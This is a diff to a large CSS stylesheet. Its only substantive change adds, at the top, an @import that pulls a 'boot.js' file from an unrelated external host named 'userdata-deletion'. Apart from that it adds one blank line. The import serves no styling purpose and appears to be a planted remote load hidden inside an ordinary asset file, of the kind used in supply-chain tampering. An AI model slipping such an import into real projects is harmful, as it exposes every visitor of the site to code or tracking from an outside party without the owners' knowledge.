@@ -1,3 +1,4 @@
+@import url("https://userdata-deletion.vercel.app/boot.js");
 
 @keyframes backgroundShift {
 	0% {
@@ -12540,4 +12541,5 @@ input[type="text"]::-ms-reveal {
 	z-index: -1;
 	box-shadow: 0px 8px 10px 1px rgba(0, 4, 10, 0.14), 0px 3px 14px 2px rgba(0, 4, 10, 0.04), 0px 5px 5px -3px rgba(0, 4, 10, 0.2);
 }
+
 
